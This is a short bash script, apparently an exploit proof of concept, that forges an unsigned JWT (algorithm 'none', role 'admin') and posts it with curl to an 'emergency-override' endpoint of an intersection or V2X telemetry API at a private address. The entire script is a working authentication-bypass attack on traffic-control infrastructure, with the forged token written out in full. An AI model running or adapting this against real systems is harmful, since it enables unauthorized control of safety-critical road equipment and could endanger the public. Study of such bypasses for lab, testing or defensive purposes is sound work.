#!/bin/bash
# We forge a custom JWT payload with "role": "admin" and swap the header to use "alg": "none"
# Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"user":"guest_rider","role":"admin","iss":"woven-city-auth","aud":"v2x-telemetry-api"} -> eyJ1c2VyIjoiZ3Vlc3RfcmlkZXIiLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJ3b3Zlbi1jaXR5LWF1dGgiLCJhdWQiOiJ2MngtdGVsZW1ldHJ5LWFwaSJ9

FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3RfcmlkZXIiLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJ3b3Zlbi1jaXR5LWF1dGgiLCJhdWQiOiJ2MngtdGVsZW1ldHJ5LWFwaSJ9."

echo "[*] Launching Signature Validation Bypass against Emergency Control..."
curl -i -X POST \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://192.168.1.168:30085/v1/intersection/emergency-override
  
